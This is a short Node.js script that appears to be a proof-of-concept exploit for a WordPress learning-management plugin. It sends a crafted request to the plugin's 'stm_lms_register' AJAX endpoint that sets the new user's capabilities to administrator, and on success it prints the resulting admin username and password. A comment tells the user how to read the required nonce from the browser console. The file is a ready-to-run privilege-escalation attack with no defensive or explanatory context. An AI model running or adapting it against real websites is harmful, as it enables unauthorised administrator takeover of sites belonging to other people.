const axios = require('axios');

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ##################################################
// #                                               #
// #                                               #
// #  To find the nonce value, use                 #
// #  stm_lms_nonces.stm_lms_register in the       #
// #  browser's console                            #
// #                                               #
// ##################################################

let host = process.argv[2]; 

let username = "Tegal1337_"+randomInt(1,1337);
let password_poc = "@Tegal1337_"+randomInt(1,1337);
let stm_lms_register = 'b6cbb28b49';
let post_data = {
  "user_login":username,
  "user_email":username+"@"+"tegal1337.com", 
  "user_password":password_poc,
  "user_password_re":password_poc,
  "become_instructor":"",
  "privacy_policy":true,
  "degree":"",
  "expertize":"",
  "auditory":"",
  "additional":[],
  "additional_instructors":[],
  "profile_default_fields_for_register":{
    "wp_capabilities":{
      "value":{
        "administrator":1
      }
    }
  }
}

axios.post(host+'/wp-admin/admin-ajax.php?action=stm_lms_register&nonce='+stm_lms_register, post_data, {
    headers: {
        'Content-Type': 'application/json',
    },
})
.then((response) => {
  let data = response.data;
  console.log(data)
  if(data.status == "success"){
    console.log('\x1b[30m\x1b[43m%s\x1b[0m', 'Registration Successful');
    console.log("Username : " + username);
    console.log("Password : " + password_poc);
  }
})
.catch((error) => {
  console.error(error);
});
